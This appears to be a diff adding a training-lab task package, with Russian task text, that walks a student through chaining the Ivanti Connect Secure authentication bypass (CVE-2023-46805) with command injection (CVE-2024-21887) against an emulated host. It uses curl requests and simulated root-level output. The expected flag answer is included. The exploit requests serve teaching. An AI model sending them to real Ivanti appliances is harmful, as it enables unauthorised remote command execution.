@@ -1,0 +1,47 @@
+{
+  "id": "web-ivanti-connect",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{1v4nt1_p4th_c0nfus10n_t0_rce}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: Ivanti CVE-2023-46805 + CVE-2024-21887\n\nЦель: `https://ivanti.local`. Цепочка: обход входа + инъекция команд.\n\n1. Убедись, что эндпоинт закрыт без обхода (ждём 401):\n   curl -s -k -o /dev/null -w '%{http_code}\\n' https://ivanti.local/api/v1/totp/user-backup-code/\n\n2. Обойди аутентификацию через path confusion (`/..;/`):\n   curl -s -k 'https://ivanti.local/api/v1/totp/user-backup-code/;/../../system/system-information'\n\n3. Добавь командную инъекцию в поле cmd:\n   curl -s -k -X POST 'https://ivanti.local/api/v1/totp/user-backup-code/;/../../system/system-information' -H 'Content-Type: application/json' --data-binary '{\"cmd\":\"id\"}'\n\n4. В ответе — вывод команды с флагом. Сохрани в found.txt и набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция ivanti.local)",
+      "cases": [
+        {
+          "match": "system-information.*cmd|cmd.*system-information|\"cmd\"",
+          "example": "-s -k -X POST '.../totp/user-backup-code/;/../../system/system-information' --data-binary '{\"cmd\":\"id\"}'",
+          "output": "{\"result\":\"uid=0(root) gid=0(root) groups=0(root)\\nnto{1v4nt1_p4th_c0nfus10n_t0_rce}\\n\"}\n"
+        },
+        {
+          "match": ";/\\.\\./\\.\\./system|/;\\.\\./|system-information",
+          "example": "-s -k 'https://ivanti.local/api/v1/totp/user-backup-code/;/../../system/system-information'",
+          "output": "{\"result\":\"system information (bypassed)\",\"build\":\"22.6.1\"}\n"
+        },
+        {
+          "match": "user-backup-code",
+          "example": "-s -k -o /dev/null -w '%{http_code}' https://ivanti.local/api/v1/totp/user-backup-code/",
+          "output": "401\n"
+        },
+        {
+          "match": "dana-na|ivanti\\.local/?$",
+          "example": "-s -k -I https://ivanti.local/dana-na/auth/url_default/welcome.cgi",
+          "output": "HTTP/2 200\nserver: Ivanti Connect Secure\nset-cookie: DSID=; path=/; secure\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только ivanti.local"
+    }
+  }
+}
